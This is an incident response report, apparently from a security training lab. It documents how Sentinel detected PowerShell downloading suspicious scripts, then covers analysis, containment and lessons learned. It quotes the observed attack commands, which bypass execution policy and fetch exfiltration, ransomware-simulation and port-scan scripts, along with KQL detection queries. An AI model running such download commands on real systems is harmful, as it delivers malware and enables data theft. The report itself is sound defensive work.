üõ°Ô∏è Incident Response Report ‚Äì Haider Naqvi

Scenario: PowerShell Suspicious Web RequestFramework: NIST 800-61 (Computer Security Incident Handling Lifecycle)


## ‚öôÔ∏è Step 1: Preparation

- Microsoft Sentinel and Microsoft Defender for Endpoint (MDE) were configured for log forwarding.
- DeviceProcessEvents logs were actively collected and ingested into Sentinel.
- Alert rule designed to detect PowerShell-based downloads using Invoke-WebRequest.
- Training provided to analysts on recognizing post-exploitation behavior.

Use Case Summary:
Sometimes when a bad actor has access to a system, they will attempt to download malicious payloads or tools directly from the internet to expand their control or establish persistence. This is often achieved using legitimate system utilities like PowerShell to blend in with normal activity. By leveraging commands such as Invoke-WebRequest, they can download files or scripts from an external server and immediately execute them, bypassing traditional defenses or detection mechanisms. This tactic is a hallmark of post-exploitation activity, enabling them to deploy malware, exfiltrate data, or establish communication channels with a command-and-control (C2) server. Detecting this behavior is critical to identifying and disrupting an ongoing attack.

## üîé Step 2: Detection and Analysis

Analytics Rule Configuration:
- Rule Name: Haider - PowerShell Suspicious Web Request
- Description: Detects usage of PowerShell to download files from the internet.
- Severity: Medium
- Run Frequency: Every 4 hours
- Lookup Period: Last 24 hours
- Entity Mapping:
  - Account: AccountName
  - Host: DeviceName
  - Process: ProcessCommandLine
- Incident Creation: Enabled
- Group all alerts into one incident per 24 hours: Enabled
- Stop query after alert: Enabled

üìç Alert Rule KQL Query

let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated



üìù Observed PowerShell Commands:

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../eicar.ps1' -OutFile 'C:\programdata\eicar.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1'
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1'



üßë User Statement:
User stated they tried to install a free utility tool and a black screen appeared briefly, then nothing happened.



‚úÖ Confirm Script Execution - KQL Query

let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine

üî¨ Script Analysis Summary:
- exfiltratedata.ps1 ‚Üí Attempts to send files to an external destination.
- eicar.ps1 ‚Üí EICAR test script used to trigger antivirus detection.
- pwncrypt.ps1 ‚Üí Encrypts files (simulated ransomware behavior).
- portscan.ps1 ‚Üí Scans local and network ports (reconnaissance).

## üõ†Ô∏è Step 3: Containment, Eradication, and Recovery

Containment Actions:
- Isolated the affected VM using Microsoft Defender for Endpoint.
- Ran a full anti-malware scan.
- Verified no persistence mechanisms or lateral movement.
- Removed machine from isolation and restored to operational status.

Execution Findings:
- exfiltratedata.ps1 and portscan.ps1 were executed by local user account.
- exfiltratedata.ps1 attempted data transfer.
- portscan.ps1 performed local port scanning.

## üìò Step 4: Post-Incident Activities

Lessons Learned:
- Affected user enrolled in enhanced cybersecurity awareness training.
- KnowBe4 awareness campaign frequency increased.
- PowerShell restricted to admin accounts only.
- Sentinel detection logic updated for better script activity detection.

Closure:
- Incident marked as "True Positive".
- Case notes and timeline finalized.
- Incident closed successfully in Sentinel.
